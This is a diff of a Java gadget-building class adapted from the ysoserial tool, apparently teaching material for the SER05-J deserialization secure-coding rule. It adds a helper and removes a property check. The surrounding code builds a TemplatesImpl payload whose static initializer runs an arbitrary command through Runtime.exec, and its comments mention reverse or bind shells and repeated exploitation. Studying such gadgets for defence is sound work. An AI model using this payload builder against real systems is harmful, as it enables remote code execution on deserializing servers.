@@ -1,6 +1,6 @@
 // The MIT License (MIT)
 //
-// Copyright (c) 2018 Robert C. Seacord
+// Copyright (c) 2019 Robert C. Seacord
 //
 // Permission is hereby granted, free of charge, to any person obtaining a copy
 // of this software and associated documentation files (the "Software"), to deal
@@ -23,7 +23,6 @@
 package ser05j;
 
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
-import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
@@ -33,7 +32,10 @@ import javassist.*;
 
 import java.io.IOException;
 import java.io.Serializable;
-import java.lang.reflect.*;
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -99,18 +101,20 @@ public class Gadgets {
     return map;
   }
 
+  public static Object createLibraryTemplatesImpl(final String command)
+      throws IllegalAccessException, InstantiationException, NotFoundException, CannotCompileException,
+      IOException, ClassNotFoundException, NoSuchFieldException {
+        return createTemplatesImpl(
+          command,
+          Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
+          Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
+          Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl")
+        );
+   }
 
   public static Object createTemplatesImpl(final String command)
       throws IllegalAccessException, InstantiationException, NotFoundException, CannotCompileException,
       IOException, ClassNotFoundException, NoSuchFieldException {
-    if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
-      return createTemplatesImpl(
-          command,
-          Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
-          Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
-          Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
-    }
-
     return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
   }
 
@@ -126,7 +130,7 @@ public class Gadgets {
     final CtClass clazz = pool.get(StubTransletPayload.class.getName());
     // run command in static initializer
     // could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-    clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");");   //$NON-NLS-3$ //$NON-NLS-4$
+    clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");");
     // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
     clazz.setName("ysoserial.Pwner" + System.nanoTime());
     CtClass superC = pool.get(abstTranslet.getName());
